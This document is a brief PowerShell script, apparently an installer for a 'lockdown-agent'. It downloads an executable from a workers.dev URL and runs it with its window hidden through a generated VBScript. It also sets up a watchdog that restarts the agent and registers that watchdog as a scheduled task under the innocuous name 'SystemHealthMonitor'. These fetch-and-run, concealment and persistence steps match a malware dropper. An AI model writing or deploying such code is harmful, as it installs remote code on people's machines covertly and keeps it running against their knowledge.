$d = "C:\ProgramData\LockdownAgent"
$u = "https://lockdown-serverless.mainacollins196.workers.dev/api/download"
Stop-Process -Name "lockdown-agent" -Force -EA SilentlyContinue
Remove-Item "$d\.locked" -Force -EA SilentlyContinue
iwr "$u/agent" -OutFile "$d\lockdown-agent.exe"
$vbs = @"
Set sh = CreateObject("WScript.Shell")
sh.Run """$d\lockdown-agent.exe"" --silent --config ""$d\config.json""", 0, False
"@
$vbs | Set-Content "$d\launch_agent.vbs"
$wdog = @"
Set sh = CreateObject("WScript.Shell")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='lockdown-agent.exe'")
If procs.Count = 0 Then
    sh.Run """$d\lockdown-agent.exe"" --silent --config ""$d\config.json""", 0, False
End If
"@
$wdog | Set-Content "$d\watchdog.vbs"
schtasks /Create /TN "SystemHealthMonitor" /TR "wscript.exe $d\watchdog.vbs" /SC MINUTE /MO 5 /RU "$env:USERDOMAIN\$env:USERNAME" /F
wscript.exe "$d\launch_agent.vbs"
Start-Sleep 5
Get-Process -Name "lockdown-agent"
